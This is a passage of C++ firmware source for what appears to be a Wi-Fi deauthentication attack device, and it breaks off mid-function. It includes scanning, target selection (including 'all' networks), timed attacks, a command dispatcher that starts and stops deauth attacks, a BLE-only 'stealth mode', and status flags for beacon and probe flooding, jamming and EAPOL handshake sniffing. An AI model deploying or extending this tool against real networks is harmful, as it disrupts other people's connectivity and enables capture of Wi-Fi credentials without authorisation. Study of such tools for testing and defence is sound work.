//==========================================================
// Sorting Helper
//==========================================================
void sortByChannel(std::vector<WiFiScanResult> &results) {
  for (size_t i = 0; i < results.size(); i++) {
    size_t min_idx = i;
    for (size_t j = i + 1; j < results.size(); j++) {
      if (results[j].channel < results[min_idx].channel) {
        min_idx = j;
      }
    }
    if (min_idx != i) {
      WiFiScanResult temp = results[i];
      results[i] = results[min_idx];
      results[min_idx] = temp;
    }
  }
}

//==========================================================
// Wi-Fi Scan Callback
//==========================================================
#define MAX_SCAN_RESULTS 64
volatile bool scan_done = false;
volatile bool scan_accepting = false;  // 扫描期间才允许驱动线程写入 scan_results

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (!scan_result) return RTW_SUCCESS;

  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    if ((int)record->channel < start_channel) {
      return RTW_SUCCESS;
    }

    uint8_t ssidLen = (record->SSID.len > 32) ? 32 : record->SSID.len;
    char ssidBuf[33];
    sanitizeUtf8BytesToCstr((const uint8_t *)record->SSID.val, (size_t)ssidLen, ssidBuf, sizeof(ssidBuf), false);

    char bssid_str[20];
    snprintf(bssid_str, sizeof(bssid_str),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             record->BSSID.octet[0], record->BSSID.octet[1], record->BSSID.octet[2],
             record->BSSID.octet[3], record->BSSID.octet[4], record->BSSID.octet[5]);

    if (!lockScanMutex(pdMS_TO_TICKS(500))) return RTW_SUCCESS;
    if (scan_accepting && scan_results.size() < MAX_SCAN_RESULTS) {
      WiFiScanResult result;
      result.ssid = String(ssidBuf);
      result.channel = record->channel;
      result.rssi = record->signal_strength;
      memcpy(&result.bssid, &record->BSSID, 6);
      result.bssid_str = String(bssid_str);
      scan_results.push_back(result);
    }
    unlockScanMutex();
  } else {
    if (lockScanMutex(pdMS_TO_TICKS(500))) {
      scan_accepting = false;
      scan_done = true;
      unlockScanMutex();
    } else {
      scan_accepting = false;
      scan_done = true;
    }
  }
  return RTW_SUCCESS;
}

//==========================================================
// Start a WiFi Scan
//==========================================================
int scanNetworks(bool emitBegin, bool isSync) {
  Serial.println("Starting WiFi scan...");
  if (lockScanMutex()) {
    scan_results.clear();
    scan_results.reserve(MAX_SCAN_RESULTS);
    scan_done = false;
    scan_accepting = true;
    unlockScanMutex();
  }
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    if (USE_LED) digitalWrite(LED_G, HIGH);
    // Wait for the driver to signal scan completion, using scan_time only as
    // a maximum-timeout guard so we never block forever.
    unsigned long start = millis();
    while (!scan_done && (millis() - start < scan_time)) {
      pollSerialInput();
      if (emergencyStopRequested || priorityStopPending) break;
      delay(50);
    }
    // 在 scanMutex 保护下关闭写入窗口、排序并同步选中目标，杜绝与延迟到达回调并发写 vector
    if (lockScanMutex()) {
      scan_accepting = false;
      sortByChannel(scan_results);
      if (target_mode && !target_aps.empty()) {
        for (size_t t = 0; t < target_aps.size(); t++) {
          for (size_t i = 0; i < scan_results.size(); i++) {
            if (memcmp(scan_results[i].bssid, target_aps[t].bssid, 6) == 0) {
              scan_results[i].selected = true;
              target_aps[t].channel = scan_results[i].channel;
              target_aps[t].rssi = scan_results[i].rssi;
              break;
            }
          }
        }
      }
      unlockScanMutex();
    }
    Serial.println("Scan completed!");
    blePushScanResults(emitBegin, isSync);
    if (USE_LED) digitalWrite(LED_G, LOW);
    return 0;
  } else {
    if (lockScanMutex()) {
      scan_accepting = false;
      unlockScanMutex();
    }
    if (USE_LED) digitalWrite(LED_G, LOW);
    Serial.println("Failed to start the scan!");
    return 1;
  }
}

void printScanResults() {
  std::vector<WiFiScanResult> snap = snapshotScanResults();
  Serial.println("Detected networks:");
  for (size_t i = 0; i < snap.size(); i++) {
    String freq = (snap[i].channel >= 36) ? "5GHz" : "2.4GHz";
    Serial.print(i);
    Serial.print("\tSSID: ");
    Serial.print(snap[i].ssid);
    Serial.print("\tBSSID: ");
    Serial.print(snap[i].bssid_str);
    Serial.print("\tChannel: ");
    Serial.print(snap[i].channel);
    Serial.print("\tRSSI: ");
    Serial.print(snap[i].rssi);
    Serial.print(" dBm\t");
    Serial.println(freq);
  }
}

//==========================================================
// Timed Attack
//==========================================================
void startTimedAttack(unsigned long durationMs) {
  timedAttackEnabled = true;
  attackStartTime    = millis();
  attackDuration     = durationMs;
  attack_enabled     = true;
}

void checkTimedAttack() {
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    attack_enabled     = false;
    timedAttackEnabled = false;
    blePushStatus();
    Serial.println("[INFO] Timed attack ended.");
  }
  bool sniffNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffNow = isSniffing;
  rtw_exit_critical(NULL, NULL);
  if (timedSniffEnabled && sniffNow && (millis() - sniffStartTime > sniffDuration)) {
    timedSniffEnabled = false;
    stopSniffing();
    blePushStatus();
    Serial.println("[INFO] Timed sniff ended, SoftAP restored.");
  }
}

bool shouldAbortCycle() {
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    return true;
  }
  pollSerialInput();
  if (emergencyStopRequested || priorityStopPending) {
    return true;
  }
  if (hasQueuedStopInCmdRing()) {
    emergencyStopRequested = true;
    return true;
  }
  return false;
}

//==========================================================
// JSON Builders
//==========================================================
String jsonEscapeTruncated(const String &s, size_t maxEscapedBytes, const char *ellipsis) {
  String out;
  size_t len = s.length();
  if (len == 0 || maxEscapedBytes == 0) return out;
  size_t reserveLen = len + 16;
  if (maxEscapedBytes != (size_t)-1 && reserveLen > maxEscapedBytes) {
    reserveLen = maxEscapedBytes;
  }
  out.reserve(reserveLen);

  size_t ellLen = (ellipsis != nullptr) ? strlen(ellipsis) : 0;
  if (maxEscapedBytes != (size_t)-1 && ellLen > maxEscapedBytes) {
    ellLen = 0;
  }

  const uint8_t *data = (const uint8_t *)s.c_str();
  size_t i = 0;
  size_t lastEllipsisCut = 0;
  bool truncated = false;

  while (i < len) {
    uint8_t c = data[i];
    if (c == 0x00) {
      i++;
      continue;
    }

    char seqBuf[8];
    size_t seqLen = 0;
    size_t consume = 1;

    if (c == '"') {
      seqBuf[0] = '\\'; seqBuf[1] = '"'; seqLen = 2;
    } else if (c == '\\') {
      seqBuf[0] = '\\'; seqBuf[1] = '\\'; seqLen = 2;
    } else if (c == '\b') {
      seqBuf[0] = '\\'; seqBuf[1] = 'b'; seqLen = 2;
    } else if (c == '\f') {
      seqBuf[0] = '\\'; seqBuf[1] = 'f'; seqLen = 2;
    } else if (c == '\n') {
      seqBuf[0] = '\\'; seqBuf[1] = 'n'; seqLen = 2;
    } else if (c == '\r') {
      seqBuf[0] = '\\'; seqBuf[1] = 'r'; seqLen = 2;
    } else if (c == '\t') {
      seqBuf[0] = '\\'; seqBuf[1] = 't'; seqLen = 2;
    } else if (c < 0x20 || c == 0x7F) {
      snprintf(seqBuf, sizeof(seqBuf), "\\u%04x", (unsigned)c);
      seqLen = 6;
    } else if (c < 0x80) {
      seqBuf[0] = (char)c;
      seqLen = 1;
    } else {
      size_t utf8Len = validUtf8CharLen(&data[i], len - i);
      if (utf8Len > 0 && utf8Len <= 4) {
        memcpy(seqBuf, &data[i], utf8Len);
        seqLen = utf8Len;
        consume = utf8Len;
      } else {
        seqBuf[0] = '?';
        seqLen = 1;
        consume = 1;
      }
    }

    seqBuf[seqLen] = '\0';
    if (maxEscapedBytes != (size_t)-1 && (out.length() + seqLen > maxEscapedBytes)) {
      truncated = true;
      break;
    }
    out += seqBuf;
    if (maxEscapedBytes != (size_t)-1 && (out.length() + ellLen <= maxEscapedBytes)) {
      lastEllipsisCut = out.length();
    }
    i += consume;
  }

  if (truncated && ellLen > 0) {
    out.remove((unsigned int)lastEllipsisCut);
    out += ellipsis;
  }
  return out;
}

String jsonEscape(const String &s) {
  return jsonEscapeTruncated(s, (size_t)-1, "");
}

String getScanResultsJSON() {
  std::vector<WiFiScanResult> snap = snapshotScanResults();
  String json;
  json.reserve(64 + snap.size() * 140);
  json = "{\"count\":" + String(snap.size()) + ",\"networks\":[";
  for (size_t i = 0; i < snap.size(); i++) {
    if (i) json += ",";
    json += "{";
    json += "\"index\":" + String(i) + ",";
    json += "\"ssid\":\"" + jsonEscape(snap[i].ssid) + "\",";
    json += "\"bssid\":\"" + snap[i].bssid_str + "\",";
    json += "\"channel\":" + String(snap[i].channel) + ",";
    json += "\"rssi\":" + String(snap[i].rssi) + ",";
    json += "\"band\":\"" + String((snap[i].channel >= 36) ? "5GHz" : "2.4GHz") + "\",";
    json += "\"selected\":" + String(snap[i].selected ? "true" : "false");
    json += "}";
  }
  json += "]}";
  return json;
}

String getStatusJSON() {
  size_t scanCount = 0;
  size_t targetCount = 0;
  bool targetModeSnap = false;
  getScanAndTargetCountsSafe(scanCount, targetCount, targetModeSnap);

  bool sniffingSnap = false;
  bool deauthSniffSnap = false;
  int chSnap = WIFI_CHANNEL;
  rtw_enter_critical(NULL, NULL);
  sniffingSnap = isSniffing;
  deauthSniffSnap = deauth_sniff_enabled;
  chSnap = currentChannel;
  rtw_exit_critical(NULL, NULL);

  String json;
  json.reserve(512);
  json = "{";
  json += "\"attack_enabled\":" + String(attack_enabled ? "true" : "false") + ",";
  json += "\"disassoc_enabled\":" + String(disassoc_enabled ? "true" : "false") + ",";
  json += "\"timed_attack\":" + String(timedAttackEnabled ? "true" : "false") + ",";
  json += "\"timed_sniff\":" + String(timedSniffEnabled ? "true" : "false") + ",";
  json += "\"sniffing\":" + String(sniffingSnap ? "true" : "false") + ",";
  json += "\"hopping\":" + String(isHopping ? "true" : "false") + ",";
  json += "\"target_mode\":" + String(targetModeSnap ? "true" : "false") + ",";
  json += "\"scan_count\":" + String(scanCount) + ",";
  json += "\"target_count\":" + String(targetCount) + ",";
  json += "\"current_channel\":" + String(chSnap) + ",";
  json += "\"beacon_flood\":" + String(beacon_flood_enabled ? "true" : "false") + ",";
  json += "\"probe_flood\":" + String(probe_flood_enabled ? "true" : "false") + ",";
  json += "\"signal_jam\":" + String(signal_jam_enabled ? "true" : "false") + ",";
  json += "\"deauth_sniff\":" + String(deauthSniffSnap ? "true" : "false") + ",";
  json += "\"tx_ok\":" + String(tx_success_count) + ",";
  json += "\"tx_fail\":" + String(tx_fail_count) + ",";
  json += "\"ssid\":\"" + jsonEscape(String(ap_ssid)) + "\",";
  json += "\"ble_name\":\"" + jsonEscape(String(ble_name)) + "\",";
  json += "\"ap_enabled\":" + String(apEnabled ? "true" : "false") + ",";
  if (timedAttackEnabled) {
    unsigned long elapsed = millis() - attackStartTime;
    unsigned long remaining = (attackDuration > elapsed) ? (attackDuration - elapsed) : 0;
    json += "\"timed_remaining\":" + String(remaining) + ",";
  } else if (timedSniffEnabled) {
    unsigned long elapsed = millis() - sniffStartTime;
    unsigned long remaining = (sniffDuration > elapsed) ? (sniffDuration - elapsed) : 0;
    json += "\"timed_remaining\":" + String(remaining) + ",";
  }
  json += "\"uptime\":" + String(millis());
  json += "}";
  return json;
}

String getInfoJSON() {
  String json;
  json.reserve(320);
  json = "{";
  json += "\"cycle_delay\":" + String(cycle_delay) + ",";
  json += "\"scan_time\":" + String(scan_time) + ",";
  json += "\"num_frames\":" + String(num_send_frames) + ",";
  json += "\"start_channel\":" + String(start_channel) + ",";
  json += "\"scan_between_cycles\":" + String(scan_between_cycles ? "true" : "false") + ",";
  json += "\"led\":" + String(USE_LED ? "true" : "false") + ",";
  json += "\"ssid\":\"" + jsonEscape(String(ap_ssid)) + "\",";
  // 决策 C：HTTP /api/info 不返回明文 ap_pass，仅留空提示未修改
  json += "\"pass\":\"\",";
  json += "\"ble_name\":\"" + jsonEscape(String(ble_name)) + "\",";
  json += "\"channel\":" + String(WIFI_CHANNEL);
  json += "}";
  return json;
}

String getLogsJSON() {
  char logSnapshot[WEB_LOG_HISTORY_SIZE][LOG_STR_LEN];
  uint8_t count = 0;
  bool sniffingSnap = false;
  SniffMode modeSnap = SNIFF_STOP;
  bool hoppingSnap = false;
  int chSnap = WIFI_CHANNEL;

  // 单次临界区内原子拷贝日志快照（禁止在临界区内做 String 堆分配），出锁后再拼装 JSON
  rtw_enter_critical(NULL, NULL);
  sniffingSnap = isSniffing;
  modeSnap = currentMode;
  hoppingSnap = isHopping;
  chSnap = currentChannel;
  count = webLogCount;
  if (count > WEB_LOG_HISTORY_SIZE) count = WEB_LOG_HISTORY_SIZE;
  uint8_t startIdx = (webLogHead + WEB_LOG_HISTORY_SIZE - count) % WEB_LOG_HISTORY_SIZE;
  for (uint8_t i = 0; i < count; i++) {
    uint8_t slot = (startIdx + i) % WEB_LOG_HISTORY_SIZE;
    strncpy(logSnapshot[i], webLogHistory[slot], LOG_STR_LEN - 1);
    logSnapshot[i][LOG_STR_LEN - 1] = '\0';
  }
  rtw_exit_critical(NULL, NULL);

  String json;
  json.reserve(128 + (size_t)count * 144);
  json = "{\"sniffing\":" + String(sniffingSnap ? "true" : "false") +
         ",\"mode\":" + String((int)modeSnap) +
         ",\"hopping\":" + String(hoppingSnap ? "true" : "false") +
         ",\"channel\":" + String(chSnap) +
         ",\"logs\":[";
  for (uint8_t i = 0; i < count; i++) {
    if (i > 0) json += ",";
    json += "\"" + jsonEscape(String(logSnapshot[i])) + "\"";
  }
  json += "]}";
  return json;
}

//==========================================================
// HTTP Helpers
//==========================================================
String httpHeader(int code, const String &contentType, int contentLength = -1) {
  const char *reason = "OK";
  switch (code) {
    case 200: reason = "OK"; break;
    case 400: reason = "Bad Request"; break;
    case 403: reason = "Forbidden"; break;
    case 404: reason = "Not Found"; break;
    case 405: reason = "Method Not Allowed"; break;
    case 408: reason = "Request Timeout"; break;
    case 413: reason = "Payload Too Large"; break;
    case 500: reason = "Internal Server Error"; break;
    case 503: reason = "Service Unavailable"; break;
    default:  reason = "OK"; break;
  }
  String h;
  h.reserve(160);
  h = "HTTP/1.1 " + String(code) + " " + reason + "\r\n";
  h += "Content-Type: " + contentType + "\r\n";
  // 决策 C：同源访问，不返回 Access-Control-Allow-Origin: *
  h += "Cache-Control: no-store\r\n";
  if (contentLength >= 0) {
    h += "Content-Length: " + String(contentLength) + "\r\n";
  }
  h += "Connection: close\r\n\r\n";
  return h;
}

bool sendLargeText(WiFiClient &client, const char *data, size_t totalLen) {
  if (!data && totalLen > 0) return false;
  const size_t CHUNK_SIZE = 1024;
  size_t sent = 0;
  unsigned long lastProgressMs = millis();
  while (sent < totalLen && client.connected()) {
    size_t toSend = (totalLen - sent > CHUNK_SIZE) ? CHUNK_SIZE : (totalLen - sent);
    size_t written = client.write((const uint8_t *)data + sent, toSend);
    if (written > 0) {
      sent += written;
      lastProgressMs = millis();
      if (sent < totalLen) {
        delay(2);  // give lwIP time to drain its send window
      }
    } else {
      if (!client.connected() || (millis() - lastProgressMs >= 1500)) {
        return false;
      }
      delay(5);
    }
  }
  return (sent == totalLen);
}

bool sendHttpResponse(WiFiClient &client, int code, const String &contentType, const char *body, size_t bodyLen) {
  String hdr = httpHeader(code, contentType, (int)bodyLen);
  if (!sendLargeText(client, hdr.c_str(), hdr.length())) {
    return false;
  }
  if (bodyLen > 0 && body != nullptr) {
    return sendLargeText(client, body, bodyLen);
  }
  return true;
}

String getHttpRequestLine(const String &request) {
  int lineEnd = request.indexOf('\n');
  String firstLine = (lineEnd >= 0) ? request.substring(0, lineEnd) : request;
  if (firstLine.endsWith("\r")) {
    firstLine.remove(firstLine.length() - 1);
  }
  return firstLine;
}

String parsePath(const String &request) {
  String firstLine = getHttpRequestLine(request);
  int start = firstLine.indexOf(' ');
  if (start < 0) return "/";
  start++;
  while (start < (int)firstLine.length() && firstLine.charAt(start) == ' ') start++;
  int end = firstLine.indexOf(' ', start);
  if (end < 0) end = firstLine.length();
  if (end <= start) return "/";
  return firstLine.substring(start, end);
}

String parseMethod(const String &request) {
  String firstLine = getHttpRequestLine(request);
  int end = firstLine.indexOf(' ');
  if (end <= 0) return "";
  String method = firstLine.substring(0, end);
  method.toUpperCase();
  return method;
}

String parseBody(const String &request) {
  int idx = request.indexOf("\r\n\r\n");
  if (idx >= 0) return request.substring(idx + 4);
  idx = request.indexOf("\n\n");
  if (idx >= 0) return request.substring(idx + 2);
  return "";
}

// 1 = valid Content-Length, 0 = not present, -1 = malformed/negative
int parseContentLengthHeader(const String &headers, long &outLen) {
  outLen = 0;
  int pos = 0;
  int total = (int)headers.length();
  while (pos < total) {
    int nl = headers.indexOf('\n', pos);
    String line = (nl >= 0) ? headers.substring(pos, nl) : headers.substring(pos);
    if (line.endsWith("\r")) line.remove(line.length() - 1);
    if (startsWithIgnoreCase(line, "Content-Length:")) {
      String valStr = line.substring(15);
      valStr.trim();
      long parsed = -1;
      if (!parseStrictLong(valStr, parsed) || parsed < 0) {
        return -1;
      }
      outLen = parsed;
      return 1;
    }
    if (nl < 0) break;
    pos = nl + 1;
  }
  return 0;
}

String urlDecode(const String &s) {
  String out;
  out.reserve(s.length());
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '+') {
      out += ' ';
    } else if (c == '%' && i + 2 < s.length() &&
               isxdigit((unsigned char)s[i + 1]) &&
               isxdigit((unsigned char)s[i + 2])) {
      char hex[3] = {s[i + 1], s[i + 2], '\0'};
      unsigned long val = strtoul(hex, nullptr, 16);
      // 过滤 %00 空字节注入
      if (val != 0) {
        out += (char)val;
      }
      i += 2;
    } else {
      out += c;
    }
  }
  return out;
}

String getQueryParam(const String &path, const String &key) {
  int q = path.indexOf('?');
  if (q < 0) return "";
  String query = path.substring(q + 1);
  String prefix = key + "=";
  int start = -1;
  for (int from = 0; from < (int)query.length(); ) {
    int pos = query.indexOf(prefix, from);
    if (pos < 0) break;
    // Accept the key only at the start or right after a '&', so that e.g.
    // "led" does not match inside "use_led".
    if (pos == 0 || query.charAt(pos - 1) == '&') {
      start = pos;
      break;
    }
    from = pos + 1;
  }
  if (start < 0) return "";
  start += prefix.length();
  int end = query.indexOf('&', start);
  if (end < 0) end = query.length();
  return urlDecode(query.substring(start, end));
}

String getPostValue(const String &body, const String &key) {
  String prefix = key + "=";
  int start = -1;
  for (int from = 0; from < (int)body.length(); ) {
    int pos = body.indexOf(prefix, from);
    if (pos < 0) break;
    if (pos == 0 || body.charAt(pos - 1) == '&') {
      start = pos;
      break;
    }
    from = pos + 1;
  }
  if (start < 0) return "";
  start += prefix.length();
  int end = body.indexOf('&', start);
  if (end < 0) end = body.length();
  return urlDecode(body.substring(start, end));
}

//==========================================================
// Config Validation Helpers (shared by CLI/BLE 'set' and HTTP /api/config)
//==========================================================
bool parseStrictLong(const String &s, long &out) {
  if (s.length() == 0) return false;
  const char *cstr = s.c_str();
  if (cstr[0] == '\0' || isspace((unsigned char)cstr[0])) return false;
  char *endPtr = nullptr;
  errno = 0;
  long val = strtol(cstr, &endPtr, 10);
  if (errno == ERANGE || endPtr == cstr || *endPtr != '\0') return false;
  out = val;
  return true;
}

bool hasFormKey(const String &body, const String &key) {
  String prefix = key + "=";
  for (int from = 0; from < (int)body.length(); ) {
    int pos = body.indexOf(prefix, from);
    if (pos < 0) return false;
    if (pos == 0 || body.charAt(pos - 1) == '&') return true;
    from = pos + 1;
  }
  return false;
}

bool validateConfigSetting(const String &key, const String &rawValue, String &errMsg) {
  String value = rawValue;
  value.replace(" ", "");
  long num = 0;
  if (key.equalsIgnoreCase("cycle_delay")) {
    if (!parseStrictLong(value, num) || num < 100 || num > 60000) {
      errMsg = "cycle_delay must be 100..60000 ms";
      return false;
    }
  } else if (key.equalsIgnoreCase("scan_time")) {
    if (!parseStrictLong(value, num) || num < 500 || num > 30000) {
      errMsg = "scan_time must be 500..30000 ms";
      return false;
    }
  } else if (key.equalsIgnoreCase("num_frames")) {
    if (!parseStrictLong(value, num) || num < 1 || num > 100) {
      errMsg = "num_frames must be 1..100";
      return false;
    }
  } else if (key.equalsIgnoreCase("start_channel")) {
    if (!parseStrictLong(value, num) || !(num == 1 || (num >= 36 && num <= 165))) {
      errMsg = "start_channel must be 1 or 36..165";
      return false;
    }
  } else if (key.equalsIgnoreCase("ap_ssid")) {
    if (rawValue.length() < 1 || rawValue.length() > 32) {
      errMsg = "AP SSID must be 1..32 bytes";
      return false;
    }
  } else if (key.equalsIgnoreCase("ap_pass")) {
    if (rawValue.length() < 8 || rawValue.length() > 63) {
      errMsg = "AP password must be 8..63 chars (WPA2)";
      return false;
    }
  } else if (key.equalsIgnoreCase("ble_name")) {
    if (rawValue.length() < 1 || rawValue.length() > 26) {
      errMsg = "BLE name must be 1..26 bytes";
      return false;
    }
  } else if (key.equalsIgnoreCase("scan_cycles") || key.equalsIgnoreCase("led")) {
    if (!value.equalsIgnoreCase("on") && !value.equalsIgnoreCase("off")) {
      errMsg = key + " must be on or off";
      return false;
    }
  }
  return true;
}

bool applyConfigSetting(const String &key, const String &rawValue, bool &apChanged) {
  String value = rawValue;
  value.replace(" ", "");
  long num = 0;
  if (key.equalsIgnoreCase("cycle_delay")) {
    parseStrictLong(value, num);
    cycle_delay = (unsigned long)num;
    return true;
  } else if (key.equalsIgnoreCase("scan_time")) {
    parseStrictLong(value, num);
    scan_time = (unsigned long)num;
    return true;
  } else if (key.equalsIgnoreCase("num_frames")) {
    parseStrictLong(value, num);
    num_send_frames = (unsigned long)num;
    return true;
  } else if (key.equalsIgnoreCase("start_channel")) {
    parseStrictLong(value, num);
    start_channel = (int)num;
    return true;
  } else if (key.equalsIgnoreCase("scan_cycles")) {
    scan_between_cycles = value.equalsIgnoreCase("on");
    return true;
  } else if (key.equalsIgnoreCase("led")) {
    USE_LED = value.equalsIgnoreCase("on");
    if (!USE_LED) {
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
    }
    return true;
  } else if (key.equalsIgnoreCase("ap_ssid")) {
    if (String(ap_ssid) != rawValue) {
      strncpy(ap_ssid, rawValue.c_str(), sizeof(ap_ssid) - 1);
      ap_ssid[sizeof(ap_ssid) - 1] = '\0';
      apChanged = true;
    }
    Serial.println("[CFG] AP SSID updated to: " + String(ap_ssid));
    return true;
  } else if (key.equalsIgnoreCase("ap_pass")) {
    if (String(ap_pass) != rawValue) {
      strncpy(ap_pass, rawValue.c_str(), sizeof(ap_pass) - 1);
      ap_pass[sizeof(ap_pass) - 1] = '\0';
      apChanged = true;
    }
    Serial.println("[CFG] AP password updated.");
    return true;
  } else if (key.equalsIgnoreCase("ble_name")) {
    updateBleName(rawValue.c_str());
    Serial.println("[CFG] BLE name updated to: " + String(ble_name));
    return true;
  }
  return false;
}

//==========================================================
//==========================================================
// Target Selection & Command Execution
//==========================================================
bool hasSelectedTargetsSafe() {
  bool ok = false;
  if (lockScanMutex()) {
    ok = (target_mode && !target_aps.empty());
    unlockScanMutex();
  }
  return ok;
}

bool applyTargetSpec(const String &rawSpec, bool allowClearEmpty, String &errMsg) {
  String spec = rawSpec;
  spec.replace(" ", "");
  spec.trim();

  if (spec.length() == 0) {
    if (!allowClearEmpty) {
      errMsg = "No target indices provided.";
      return false;
    }
    if (lockScanMutex()) {
      target_aps.clear();
      target_mode = false;
      for (size_t i = 0; i < scan_results.size(); i++) {
        scan_results[i].selected = false;
      }
      unlockScanMutex();
    }
    return true;
  }

  if (spec.equalsIgnoreCase("all")) {
    bool ok = false;
    if (lockScanMutex()) {
      if (scan_results.empty()) {
        errMsg = "No scan results available. Run 'scan' first.";
      } else {
        target_aps.clear();
        target_mode = false;
        for (size_t i = 0; i < scan_results.size(); i++) {
          scan_results[i].selected = true;
          target_aps.push_back(scan_results[i]);
        }
        target_mode = !target_aps.empty();
        ok = target_mode;
      }
      unlockScanMutex();
    }
    return ok;
  }

  std::vector<long> parsedIndices;
  int start = 0;
  while (start <= (int)spec.length()) {
    int end = spec.indexOf(',', start);
    String tok = (end == -1) ? spec.substring(start) : spec.substring(start, end);
    tok.trim();
    if (tok.length() == 0) {
      errMsg = "Empty token in target index list.";
      return false;
    }
    long parsedIdx = -1;
    if (!parseStrictLong(tok, parsedIdx) || parsedIdx < 0) {
      errMsg = "Invalid target index: " + tok;
      return false;
    }
    parsedIndices.push_back(parsedIdx);
    if (end == -1) break;
    start = end + 1;
  }
  if (parsedIndices.empty()) {
    errMsg = "No valid target indices provided.";
    return false;
  }

  bool ok = false;
  if (lockScanMutex()) {
    if (scan_results.empty()) {
      errMsg = "No scan results available. Run 'scan' first.";
    } else {
      bool allInRange = true;
      for (size_t k = 0; k < parsedIndices.size(); k++) {
        if (parsedIndices[k] < 0 || parsedIndices[k] >= (long)scan_results.size()) {
          errMsg = "Target index out of range: " + String(parsedIndices[k]);
          allInRange = false;
          break;
        }
      }
      if (allInRange) {
        target_aps.clear();
        target_mode = false;
        for (size_t i = 0; i < scan_results.size(); i++) {
          scan_results[i].selected = false;
        }
        for (size_t k = 0; k < parsedIndices.size(); k++) {
          size_t idx = (size_t)parsedIndices[k];
          if (!scan_results[idx].selected) {
            scan_results[idx].selected = true;
            target_aps.push_back(scan_results[idx]);
          }
        }
        target_mode = !target_aps.empty();
        ok = target_mode;
      }
    }
    unlockScanMutex();
  }
  return ok;
}

bool parseSniffTimeCmd(const String &command, unsigned long &durOut, SniffMode &modeOut, String &errMsg) {
  String rest = command.substring(11);
  rest.trim();
  int sp = rest.indexOf(' ');
  String durStr = (sp > 0) ? rest.substring(0, sp) : rest;
  durStr.trim();
  String modeStr = (sp > 0) ? rest.substring(sp + 1) : "all";
  modeStr.trim();
  long dur = 0;
  if (!parseStrictLong(durStr, dur) || dur <= 0) {
    errMsg = "Invalid sniff_time duration: " + durStr;
    return false;
  }
  SniffMode mode = SNIFF_ALL;
  if (modeStr.equalsIgnoreCase("all")) mode = SNIFF_ALL;
  else if (modeStr.equalsIgnoreCase("beacon")) mode = SNIFF_BEACON;
  else if (modeStr.equalsIgnoreCase("probe")) mode = SNIFF_PROBE;
  else if (modeStr.equalsIgnoreCase("deauth")) mode = SNIFF_DEAUTH;
  else if (modeStr.equalsIgnoreCase("eapol")) mode = SNIFF_EAPOL;
  else if (modeStr.equalsIgnoreCase("pwnagotchi")) mode = SNIFF_PWNAGOTCHI;
  else {
    errMsg = "Unknown sniff_time mode: " + modeStr;
    return false;
  }
  durOut = (unsigned long)dur;
  modeOut = mode;
  return true;
}

static bool failCmd(String *errOut, const String &msg, bool pushStatus = false) {
  if (errOut) *errOut = msg;
  Serial.println("[ERROR] " + msg);
  bleSendLog("[ERROR] " + msg);
  if (pushStatus) blePushStatus();
  return false;
}

bool executeCommand(String command, String *errOut, bool fromHttp) {
  command.trim();
  if (command.length() == 0) {
    if (errOut) *errOut = "Empty command";
    return false;
  }

  if (command.equalsIgnoreCase("ap off")) {
    // 决策 B：禁止通过 WebUI/HTTP 执行永久关闭热点的 ap off，仅允许 BLE/Serial
    if (fromHttp) {
      if (errOut) *errOut = "'ap off' is disabled over WebUI/HTTP; use BLE or Serial instead.";
      Serial.println("[WARN] Rejected HTTP 'ap off' per Decision B.");
      return false;
    }
    stopAllActiveAttacks();
    haltPromiscSniff();
    apEnabled = false;
    bool staOk = enterStaMode("ap off");
    blePushInfo();
    blePushStatus();
    if (staOk) {
      Serial.println("[INFO] AP + WebUI disabled. BLE-only stealth mode (STA active).");
    } else {
      Serial.println("[WARN] AP + WebUI disabled, but STA initialization failed.");
    }
    return true;
  }
  else if (command.equalsIgnoreCase("ap on")) {
    if (fromHttp && apEnabled && softApActive) {
      blePushInfo();
      blePushStatus();
      return true;
    }
    stopAllActiveAttacks();
    haltPromiscSniff();
    startSoftAP();
    blePushInfo();
    blePushStatus();
    Serial.println("[INFO] AP + WebUI re-enabled.");
    return true;
  }
  else if (command.equalsIgnoreCase("start deauther") || startsWithIgnoreCase(command, "start deauther ")) {
    String spec = (command.length() > 14) ? command.substring(15) : "";
    spec.trim();
    if (spec.length() > 0) {
      String errMsg;
      if (!applyTargetSpec(spec, false, errMsg)) {
        return failCmd(errOut, errMsg, true);
      }
    } else if (!hasSelectedTargetsSafe()) {
      // 决策 A：禁止无目标时默认全攻
      return failCmd(errOut, "No targets selected. Select targets or use 'start deauther all'.", true);
    }
    stopConflictingModesBeforeAttack();
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    attack_enabled = true;
    blePushStatus();
    Serial.println("[INFO] Deauthentication Attack started.");
    return true;
  }
  else if (command.equalsIgnoreCase("stop deauther") || command.equalsIgnoreCase("stop") || command.equalsIgnoreCase("stop all")) {
    // Universal stop: kill every attack and restore the soft AP (if apEnabled)
    stopAllActiveAttacks();
    clearDeauthSniffState();
    bool sniffActive = false;
    rtw_enter_critical(NULL, NULL);
    sniffActive = (isSniffing || deauth_sniff_enabled);
    rtw_exit_critical(NULL, NULL);
    if (sniffActive) { stopSniffing(); }  // restores AP or STA based on apEnabled
    restoreDefaultChannelIfNeeded(true);
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    blePushStatus();
    Serial.println("[INFO] All attacks stopped.");
    return true;
  }
  else if (command.equalsIgnoreCase("scan")) {
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    stopConflictingModesBeforeAttack();
    if (lockScanMutex()) {
      target_aps.clear();
      target_mode = false;
      unlockScanMutex();
    }
    scan_enabled = true;
    Serial.println("[INFO] Starting scan...");
    bleSendLine("{\"t\":\"scan_begin\"}");
    if (scanNetworks(false, false) == 0) {
      printScanResults();
      scan_enabled = false;
      Serial.println("[INFO] Scan completed.");
      return true;
    }
    else {
      scan_enabled = false;
      Serial.println("[ERROR] Scan failed.");
      bleSendLine("{\"t\":\"scan_end\",\"n\":0,\"err\":1}");
      bleSendLog("[ERROR] Wi-Fi scan failed.");
      if (errOut) *errOut = "Wi-Fi scan failed.";
      return false;
    }
  }
  else if (command.equalsIgnoreCase("results")) {
    if (getScanCountSafe() > 0) {
